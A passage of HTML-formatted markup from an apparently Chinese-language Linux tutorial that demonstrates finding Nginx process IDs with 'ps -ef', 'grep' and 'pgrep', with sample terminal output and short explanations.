</span><span class=\"crayon-cn\">4</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Aug18</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">kworker</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">0H</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d1199239358395-6\"><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Aug18</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">mm_percpu_wq</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5bab6700d1199239358395-7\"><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Aug18</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">ksoftirqd</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d1199239358395-8\"><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Aug18</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">20</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">rcu_sched</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5bab6700d1199239358395-9\"><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Aug18</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">rcu_bh</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d1199239358395-10\"><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">10</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Aug18</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">migration</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5bab6700d1199239358395-11\"><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">11</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Aug18</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">watchdog</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d1199239358395-12\"><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">12</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Aug18</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">cpuhp</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5bab6700d1199239358395-13\"><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">13</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Aug18</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">cpuhp</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d1199239358395-14\"><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">14</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Aug18</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">watchdog</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5bab6700d1199239358395-15\"><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">15</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Aug18</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">migration</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d1199239358395-16\"><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">16</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Aug18</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">ksoftirqd</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5bab6700d1199239358395-17\"><span class=\"crayon-i\">alan</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">20506</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">20496</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">39</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pts</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">bash</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d1199239358395-18\"><span class=\"crayon-i\">alan</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">20520</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">1454</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">39</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nginx</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">master </span><span class=\"crayon-e\">process </span><span class=\"crayon-e\">nginx</span></div><div class=\"crayon-line\" id=\"crayon-5bab6700d1199239358395-19\"><span class=\"crayon-i\">alan</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">20521</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">20520</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">39</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nginx</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">worker </span><span class=\"crayon-e\">process</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d1199239358395-20\"><span class=\"crayon-i\">alan</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">20526</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">20506</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">39</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pts</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">man </span><span class=\"crayon-e\">ps</span></div><div class=\"crayon-line\" id=\"crayon-5bab6700d1199239358395-21\"><span class=\"crayon-i\">alan</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">20536</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">20526</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">39</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pts</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">pager</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d1199239358395-22\"><span class=\"crayon-i\">alan</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">20564</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">20496</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">40</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pts</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bash</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0601 seconds] -->\r\n<p>您可以在上面 <code>ps</code> 命令的输出中看到 Nginx 进程。这个命令显示了将近 300 行，但是我在这个例子中缩短了它。可以想象，试图处理 300 行过程信息有点混乱。我们可以将这个输出输送到 <code>grep</code>，过滤一下仅显示 nginx。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6700d119e155191690\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nalan@workstation:~$ ps -ef |grep nginx\r\nalan     20520  1454  0 10:39 ?        00:00:00 nginx: master process nginx\r\nalan     20521 20520  0 10:39 ?        00:00:00 nginx: worker process</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6700d119e155191690-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d119e155191690-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6700d119e155191690-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6700d119e155191690-1\"><span class=\"crayon-v\">alan</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">workstation</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ps</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">ef</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-e\">grep </span><span class=\"crayon-e\">nginx</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d119e155191690-2\"><span class=\"crayon-i\">alan</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">20520</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">1454</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">39</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nginx</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">master </span><span class=\"crayon-e\">process </span><span class=\"crayon-e\">nginx</span></div><div class=\"crayon-line\" id=\"crayon-5bab6700d119e155191690-3\"><span class=\"crayon-i\">alan</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">20521</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">20520</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">39</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nginx</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">worker </span><span class=\"crayon-v\">process</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0018 seconds] -->\r\n<p>确实更好了。我们可以很快看到，Nginx 有 20520 和 20521 的 PID。</p>\n<h4 id=\"toc_8\">PGREP</h4>\n<p><code>pgrep</code> 命令更加简化单独调用 <code>grep</code> 遇到的问题。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6700d11a2667680189\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nalan@workstation:~$ pgrep nginx\r\n20520\r\n20521</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6700d11a2667680189-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6700d11a2667680189-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6700d11a2667680189-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6700d11a2667680189-1\"><span class=\"crayon-v\">alan</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">workstation</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">pgrep </span><span class=\"crayon-i\">nginx</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d11a2667680189-2\"><span class=\"crayon-cn\">20520</span></div><div class=\"crayon-line\" id=\"crayon-5bab6700d11a2667680189-3\"><span class=\"crayon-cn\">20521</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>假设您在一个托管环境中，多个用户正在运行几个不同的 Nginx 实例。您可以使用 <code>-u</code> 选项将其他人排除在输出之外。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6700d11a5482782695\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div 